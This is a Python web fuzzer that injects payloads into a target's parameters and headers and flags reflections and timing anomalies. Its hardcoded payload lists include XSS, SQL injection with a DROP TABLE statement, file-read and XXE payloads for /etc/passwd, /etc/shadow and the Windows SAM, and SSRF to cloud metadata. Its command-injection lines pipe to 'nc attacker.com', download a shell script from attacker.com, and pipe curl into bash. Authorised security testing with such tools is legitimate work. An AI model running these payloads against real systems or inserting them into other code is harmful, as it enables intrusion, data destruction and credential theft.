#!/usr/bin/env python3
"""
Advanced Web Fuzzing Module

Comprehensive fuzzing for web applications including:
- Parameter injection (XSS, SQLi, LFI, XXE, SSRF, Command Injection)
- HTTP header fuzzing
- Cookie/Session fuzzing
- Request method fuzzing
- Payload encoding/obfuscation
- Blind/Time-based detection

Author: Plascoy Security
Version: 2.0
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from colorama import Fore, Style, init
from typing import Dict, List, Tuple, Optional
import time
import random
import string
import logging
import json
import base64
import urllib.parse

init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO,
                   format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class AdvancedFuzzer:
    """Professional web application fuzzer"""
    
    # Comprehensive payload dictionary
    PAYLOADS = {
        'xss': [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '\\"><script>alert(1)</script>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<video src=x onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
        ],
        'sqli': [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL, NULL --",
            "admin' --",
            "' OR 1=1 --",
            "' OR 'x'='x",
            "1' AND '1'='1",
            "' OR 'a'='a",
            "1' OR '1'='1' /*",
            "' UNION ALL SELECT NULL --",
            "' UNION SELECT NULL, NULL, NULL --",
            "1' UNION SELECT version() --",
        ],
        'lfi': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            'file:///etc/passwd',
            '/etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '....%5c....%5c....%5cwindows%5csystem32%5cconfig%5csam',
            '/proc/self/environ',
            '/var/log/apache2/access.log',
            '/etc/shadow',
            '../../etc/hosts',
        ],
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ],
        'command_injection': [
            '; ls',
            '| cat /etc/passwd',
            '`whoami`',
            '$(whoami)',
            '; id;',
            '& whoami &',
            '| nc attacker.com 1234',
            '; wget http://attacker.com/shell.sh -O /tmp/shell.sh;',
            '| curl http://attacker.com/shell.sh | bash',
        ],
        'open_redirect': [
            'http://attacker.com',
            'https://attacker.com',
            '//attacker.com',
            '/attacker.com',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '//evil.com@legitimate.com',
            'http://legitimate.com@attacker.com',
        ],
        'ssrf': [
            'http://127.0.0.1:22',
            'http://localhost:8080',
            'http://169.254.169.254/latest/meta-data',
            'http://192.168.1.1',
            'gopher://127.0.0.1:21',
            'file:///etc/passwd',
            'dict://127.0.0.1:11211',
        ],
        'ldap_injection': [
            '*',
            '*)(uid=*',
            'admin*',
            '*))(&(uid=*',
        ],
        'path_traversal': [
            '../',
            '../../',
            '../../../',
            '..\\',
            '..\\..\\',
            '..;/',
            '..%252f',
        ]
    }
    
    def __init__(self, target: str, timeout: int = 10, verify_ssl: bool = False):
        """Initialize fuzzer"""
        self.target = self._normalize_target(target)
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.results = {
            'vulnerabilities': [],
            'reflected': [],
            'timing_anomalies': [],
            'status_anomalies': [],
            'total_requests': 0
        }
        self.session = self._create_session()
        self.baseline_time = 0
    
    def _normalize_target(self, target: str) -> str:
        """Normalize target URL"""
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        return target.rstrip('/')
    
    def _create_session(self) -> requests.Session:
        """Create robust requests session"""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        session.verify = self.verify_ssl
        
        return session
    
    def scan(self, verbose: bool = False, payload_type: str = 'xss',
             parameters: Optional[List[str]] = None) -> Dict:
        """
        Perform fuzzing scan
        
        Args:
            verbose: Enable verbose output
            payload_type: Type of payloads to test
            parameters: List of parameter names to fuzz
            
        Returns:
            Dictionary with fuzzing results
        """
        print(Fore.CYAN + Style.BRIGHT + "\n[*] Advanced Fuzzing Started...")
        print(Fore.CYAN + f"[*] Target: {self.target}")
        print(Fore.CYAN + f"[*] Payload type: {payload_type}")
        
        # Establish baseline
        self._establish_baseline(verbose)
        
        # Test parameters
        if parameters:
            self._fuzz_parameters(parameters, payload_type, verbose)
        else:
            self._fuzz_common_parameters(payload_type, verbose)
        
        # Test headers
        self._fuzz_headers(verbose)
        
        # Test all payload types if requested
        if payload_type == 'all':
            for ptype in self.PAYLOADS.keys():
                if ptype != 'all':
                    self._fuzz_parameters(['id', 'name', 'q'], ptype, verbose)
        
        self._print_summary()
        return self.results
    
    def _establish_baseline(self, verbose: bool = False):
        """Establish baseline response characteristics"""
        try:
            start = time.time()
            response = self.session.get(self.target, timeout=self.timeout)
            self.baseline_time = time.time() - start
            self.baseline_status = response.status_code
            self.baseline_length = len(response.text)
            
            if verbose:
                print(Fore.BLUE + f"[*] Baseline: Status {response.status_code}, "
                      f"Time {self.baseline_time:.2f}s, Size {self.baseline_length}")
        except Exception as e:
            logger.warning(f"Error establishing baseline: {str(e)}")
    
    def _fuzz_parameters(self, params: List[str], payload_type: str, verbose: bool = False):
        """Fuzz specified parameters"""
        print(Fore.BLUE + f"\n[*] Fuzzing {len(params)} parameters with {payload_type}...")
        
        payloads = self.PAYLOADS.get(payload_type, [])
        
        for param in params:
            for idx, payload in enumerate(payloads):
                self.results['total_requests'] += 1
                
                # Test GET
                self._test_payload(param, payload, 'GET', verbose)
                
                # Test POST
                self._test_payload(param, payload, 'POST', verbose)
                
                if (idx + 1) % 5 == 0 and verbose:
                    print(Fore.BLUE + f"[*] Progress: {idx + 1}/{len(payloads)} payloads")
    
    def _fuzz_common_parameters(self, payload_type: str, verbose: bool = False):
        """Fuzz common parameter names"""
        common_params = [
            'id', 'name', 'q', 'search', 'username', 'password',
            'email', 'url', 'file', 'path', 'cmd', 'query',
            'user', 'admin', 'sort', 'order', 'redirect',
            'next', 'page', 'cat', 'action', 'method'
        ]
        
        self._fuzz_parameters(common_params, payload_type, verbose)
    
    def _test_payload(self, param: str, payload: str, method: str, verbose: bool = False):
        """Test a single payload"""
        try:
            start = time.time()
            
            if method == 'GET':
                params = {param: payload}
                response = self.session.get(self.target, params=params, timeout=self.timeout)
            else:  # POST
                data = {param: payload}
                response = self.session.post(self.target, data=data, timeout=self.timeout)
            
            elapsed = time.time() - start
            
            # Check for reflections
            if payload in response.text or self._is_payload_reflected(payload, response.text):
                print(Fore.RED + Style.BRIGHT + f"[!] REFLECTED: {param} ({method}) - {payload[:40]}")
                self.results['vulnerabilities'].append({
                    'type': 'reflection',
                    'param': param,
                    'method': method,
                    'payload': payload[:100]
                })
            
            # Check for timing anomalies
            if elapsed > self.baseline_time * 3:
                print(Fore.YELLOW + f"[!] SLOW RESPONSE: {param} - {elapsed:.2f}s")
                self.results['timing_anomalies'].append({
                    'param': param,
                    'time': elapsed,
                    'baseline': self.baseline_time
                })
            
            # Check for status anomalies
            if response.status_code not in [200, 404]:
                self.results['status_anomalies'].append({
                    'param': param,
                    'status': response.status_code
                })
                
        except Exception as e:
            logger.debug(f"Error testing payload: {str(e)}")
    
    def _fuzz_headers(self, verbose: bool = False):
        """Fuzz HTTP headers"""
        print(Fore.BLUE + "\n[*] Fuzzing HTTP headers...")
        
        test_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Forwarded-Host': 'attacker.com',
            'X-Original-URL': '/admin',
            'X-Rewrite-URL': '/admin',
            'Host': 'attacker.com',
            'User-Agent': '<script>alert(1)</script>',
            'Referer': '"><script>alert(1)</script>',
            'X-Custom-Header': '../../../etc/passwd',
        }
        
        for header_name, header_value in test_headers.items():
            try:
                headers = self.session.headers.copy()
                headers[header_name] = header_value
                
                response = self.session.get(self.target, headers=headers, timeout=self.timeout)
                
                if header_value in response.text:
                    print(Fore.RED + f"[!] Header injection: {header_name}")
                    
            except Exception as e:
                logger.debug(f"Error fuzzing header: {str(e)}")
    
    def _is_payload_reflected(self, payload: str, response: str) -> bool:
        """Check if payload is reflected in response"""
        # Check exact match
        if payload in response:
            return True
        
        # Check HTML entity encoded
        encoded = payload.replace('"', '&quot;').replace("'", '&#x27;')
        if encoded in response:
            return True
        
        # Check URL encoded
        url_encoded = urllib.parse.quote(payload)
        if url_encoded in response:
            return True
        
        return False
    
    def _print_summary(self):
        """Print fuzzing summary"""
        print(Fore.CYAN + Style.BRIGHT + "\n[*] Fuzzing Results Summary")
        print(Fore.CYAN + f"[*] Total requests: {self.results['total_requests']}")
        
        vulns = len(self.results['vulnerabilities'])
        if vulns > 0:
            print(Fore.RED + Style.BRIGHT + f"[!] Vulnerabilities: {vulns}")
            for vuln in self.results['vulnerabilities'][:5]:
                print(Fore.RED + f"    - {vuln['param']} ({vuln['method']})")
        else:
            print(Fore.GREEN + "[+] No obvious vulnerabilities detected")
        
        timing = len(self.results['timing_anomalies'])
        if timing > 0:
            print(Fore.YELLOW + f"[!] Timing anomalies: {timing}")
        
        status_issues = len(self.results['status_anomalies'])
        if status_issues > 0:
            print(Fore.YELLOW + f"[!] Status anomalies: {status_issues}")


def fuzz_target(target: str, fuzz_type: str = 'xss', 
                parameters: Optional[List[str]] = None) -> List[Dict]:
    """
    Standalone fuzzing function
    
    Args:
        target: Target URL
        fuzz_type: Type of fuzzing ('xss', 'sqli', 'all', etc.)
        parameters: List of parameter names to fuzz
        
    Returns:
        List of vulnerabilities found
    """
    fuzzer = AdvancedFuzzer(target)
    results = fuzzer.scan(verbose=False, payload_type=fuzz_type, parameters=parameters)
    
    return results['vulnerabilities']


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 fuzzer.py <target> [xss|sqli|lfi|all] [--verbose]")
        sys.exit(1)
    
    target = sys.argv[1]
    fuzz_type = sys.argv[2] if len(sys.argv) > 2 else 'xss'
    verbose = '--verbose' in sys.argv
    
    fuzzer = AdvancedFuzzer(target)
    fuzzer.scan(verbose=verbose, payload_type=fuzz_type)
